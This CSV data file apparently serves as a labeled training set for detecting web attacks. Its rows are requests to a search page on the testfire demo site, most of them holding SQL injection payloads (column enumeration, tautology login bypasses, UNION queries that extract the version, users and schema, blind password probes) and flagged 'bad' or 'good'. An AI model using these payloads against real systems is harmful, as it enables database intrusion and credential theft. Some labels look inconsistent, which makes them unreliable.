path,content,host,class_flag
/search.jsp?query= ORDER BY 20# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 21# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 22# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 23# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 24# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 25# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 26# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 27# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 28# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 29# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 30#,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 31337#,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 2 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 1 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 3 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 4 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 5 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 6 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 7 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 8 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 9 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 10 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 11 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 12 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 13 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 14 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 15 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 17 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 16 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 18 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 19 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 20 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 22 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 21 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 23 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 24 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 25 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 26 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 27 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 28 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 29 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 30 ,,demo.testfire.net,['bad']
/search.jsp?query= RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 31337 ,,demo.testfire.net,['bad']
/search.jsp?query= RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',,demo.testfire.net,['bad']
/search.jsp?query=IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,,demo.testfire.net,['bad']
/search.jsp?query=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,,demo.testfire.net,['bad']
/search.jsp?query=%' AND 8310=8310 AND '%'=',,demo.testfire.net,['bad']
/search.jsp?query=%' AND 8310=8311 AND '%'=',,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,1,1))='X'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,1,1))='M'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,2,1))='i'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,2,1))='y'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,3,1))='c'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,3,1))='S'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,3,1))='X'",,demo.testfire.net,['bad']
/search.jsp?query='-',,demo.testfire.net,['good']
/search.jsp?query=' ',,demo.testfire.net,['good']
/search.jsp?query='&',,demo.testfire.net,['good']
/search.jsp?query='^',,demo.testfire.net,['good']
/search.jsp?query='*',,demo.testfire.net,['bad']
/search.jsp?query=' or ''-',,demo.testfire.net,['bad']
/search.jsp?query=' or '' ',,demo.testfire.net,['bad']
/search.jsp?query=' or ''&',,demo.testfire.net,['bad']
/search.jsp?query=' or ''^',,demo.testfire.net,['bad']
/search.jsp?query=' or ''*',,demo.testfire.net,['bad']
"/search.jsp?query=""-""",,demo.testfire.net,['good']
"/search.jsp?query="" """,,demo.testfire.net,['good']
"/search.jsp?query=""&""",,demo.testfire.net,['good']
"/search.jsp?query=""^""",,demo.testfire.net,['good']
"/search.jsp?query=""*""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"-""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """" """,,demo.testfire.net,['bad']
"/search.jsp?query="" or """"&""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"^""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"*""",,demo.testfire.net,['bad']
/search.jsp?query=or true--,,demo.testfire.net,['bad']
"/search.jsp?query="" or true--",,demo.testfire.net,['bad']
/search.jsp?query=' or true--,,demo.testfire.net,['bad']
"/search.jsp?query="") or true--",,demo.testfire.net,['bad']
/search.jsp?query=') or true--,,demo.testfire.net,['bad']
/search.jsp?query=' or 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query=') or ('x')=('x,,demo.testfire.net,['bad']
/search.jsp?query=')) or (('x'))=(('x,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""x""=""x",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""x"")=(""x",,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
"/search.jsp?query="")) or ((""x""))=((""x",,demo.testfire.net,['bad']
/search.jsp?query=or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=admin' --,,demo.testfire.net,['bad']
/search.jsp?query=admin' #,,demo.testfire.net,['good']
/search.jsp?query=admin'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin'or 1=1 or ''=',,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=admin' or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin') or ('1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin') or '1'='1'#,,demo.testfire.net,['bad']
"/search.jsp?query=1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" --",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" #",,demo.testfire.net,['good']
"/search.jsp?query=admin""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query=admin""or 1=1 or """"=""",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"" or 1=1/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or (""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query=admin"") or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query=1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
/search.jsp?query===,,demo.testfire.net,['good']
/search.jsp?query==,,demo.testfire.net,['good']
/search.jsp?query=',,demo.testfire.net,['good']
/search.jsp?query=' --,,demo.testfire.net,['bad']
/search.jsp?query=' #,,demo.testfire.net,['good']
/search.jsp?query=' ,,demo.testfire.net,['good']
/search.jsp?query='/*,,demo.testfire.net,['bad']
/search.jsp?query='--,,demo.testfire.net,['bad']
/search.jsp?query='#,,demo.testfire.net,['good']
"/search.jsp?query="" --",,demo.testfire.net,['bad']
"/search.jsp?query="" #",,demo.testfire.net,['good']
/search.jsp?query=' and 1='1,,demo.testfire.net,['bad']
"/search.jsp?query=""/*",,demo.testfire.net,['bad']
/search.jsp?query=' and a='a,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query= or true,,demo.testfire.net,['bad']
/search.jsp?query=' or ''=',,demo.testfire.net,['bad']
"/search.jsp?query="" or """"=""",,demo.testfire.net,['bad']
"/search.jsp?query=' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
"/search.jsp?query="" AND 1=0 UNION ALL SELECT """", ""81dc9bdb52d04dc20036dbd8313ed055",,demo.testfire.net,['bad']
/search.jsp?query=12) and '12='1,,demo.testfire.net,['bad']
/search.jsp?query= and 1=1,,demo.testfire.net,['bad']
/search.jsp?query= and 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' and 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' and 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' group by password having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' group by userid having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' group by username having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query= like '%',,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 ,,demo.testfire.net,['bad']
/search.jsp?query=' or         0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 ,,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 --",,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 #",,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 ",,demo.testfire.net,['bad']
/search.jsp?query=%' or '0'='0,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=' or '12='1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 ,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1;#,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=') or '1'='1--,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1--,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'/*,,demo.testfire.net,['bad']
/search.jsp?query=') or ('1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query='or'1=1,,demo.testfire.net,['bad']
/search.jsp?query='or'1=12,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1 --",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1 ",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1--",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1/*",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1#",,demo.testfire.net,['bad']
"/search.jsp?query="" or 1=1",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="") or ""1""=""1""#",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""--",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""/*",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""1""=""1""#",,demo.testfire.net,['bad']
/search.jsp?query=) or '12='1,,demo.testfire.net,['bad']
/search.jsp?query=) or ('12='1,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 LIMIT 1;#,,demo.testfire.net,['bad']
/search.jsp?query='or 1=1 or ''=',,demo.testfire.net,['bad']
"/search.jsp?query=""or 1=1 or """"=""",,demo.testfire.net,['bad']
/search.jsp?query=' or 'a'='a,,demo.testfire.net,['bad']
/search.jsp?query=' or a=a--,,demo.testfire.net,['bad']
/search.jsp?query=' or a=a,,demo.testfire.net,['bad']
/search.jsp?query=') or ('a'='a,,demo.testfire.net,['bad']
"/search.jsp?query="") or (""a""=""a",,demo.testfire.net,['bad']
"/search.jsp?query=') or ('a'='a and hi"") or (""a""=""a",,demo.testfire.net,['bad']
"/search.jsp?query="" or ""a""=""a",,demo.testfire.net,['bad']
/search.jsp?query=' or 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' or 'one'='one,,demo.testfire.net,['bad']
/search.jsp?query=' or uid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or uname like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or userid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or username like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or user like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query=') or ('x'='x,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""x""=""x",,demo.testfire.net,['bad']
/search.jsp?query=' OR 'x'='x'#;,,demo.testfire.net,['bad']
"/search.jsp?query=' UNION ALL SELECT 1, @@version;#",,demo.testfire.net,['bad']
/search.jsp?query='=' 'or' and '=' 'or',,demo.testfire.net,['bad']
"/search.jsp?query=' UNION ALL SELECT system_user(),user();#",,demo.testfire.net,['bad']
"/search.jsp?query=' UNION select table_schema,table_name FROM information_Schema.tables;#",,demo.testfire.net,['bad']
"/search.jsp?query=admin' and substring(password/text(),1,1)='7",,demo.testfire.net,['bad']
"/search.jsp?query=' and substring(password/text(),1,1)='7",,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 limit 1 -- -+,,demo.testfire.net,['bad']
"/search.jsp?query='=""or'",,demo.testfire.net,['bad']
/search.jsp?query='-',,demo.testfire.net,['good']
/search.jsp?query=' ',,demo.testfire.net,['good']
/search.jsp?query='&',,demo.testfire.net,['good']
/search.jsp?query='^',,demo.testfire.net,['good']
/search.jsp?query='*',,demo.testfire.net,['bad']
/search.jsp?query=' or ''-',,demo.testfire.net,['bad']
/search.jsp?query=' or '' ',,demo.testfire.net,['bad']
/search.jsp?query=' or ''&',,demo.testfire.net,['bad']
/search.jsp?query=' or ''^',,demo.testfire.net,['bad']
/search.jsp?query=' or ''*',,demo.testfire.net,['bad']
"/search.jsp?query=""-""",,demo.testfire.net,['good']
"/search.jsp?query="" """,,demo.testfire.net,['good']
"/search.jsp?query=""&""",,demo.testfire.net,['good']
"/search.jsp?query=""^""",,demo.testfire.net,['good']
"/search.jsp?query=""*""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"-""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """" """,,demo.testfire.net,['bad']
"/search.jsp?query="" or """"&""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"^""",,demo.testfire.net,['bad']
"/search.jsp?query="" or """"*""",,demo.testfire.net,['bad']
/search.jsp?query=or true--,,demo.testfire.net,['bad']
"/search.jsp?query="" or true--",,demo.testfire.net,['bad']
/search.jsp?query=' or true--,,demo.testfire.net,['bad']
"/search.jsp?query="") or true--",,demo.testfire.net,['bad']
/search.jsp?query=') or true--,,demo.testfire.net,['bad']
/search.jsp?query=' or 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query=') or ('x')=('x,,demo.testfire.net,['bad']
/search.jsp?query=')) or (('x'))=(('x,,demo.testfire.net,['bad']
"/search.jsp?query="" or ""x""=""x",,demo.testfire.net,['bad']
"/search.jsp?query="") or (""x"")=(""x",,demo.testfire.net,['bad']
"/search.jsp?query="")) or ((""x""))=((""x",,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1/*,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1#,,demo.testfire.net,['bad']
/search.jsp?query=admin' --,,demo.testfire.net,['bad']
/search.jsp?query=admin' #,,demo.testfire.net,['good']
/search.jsp?query=admin' or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'#,,demo.testfire.net,['bad']
/search.jsp?query=admin'/*,,demo.testfire.net,['bad']
/search.jsp?query=admin' or '1'='1'/*,,demo.testfire.net,['bad']
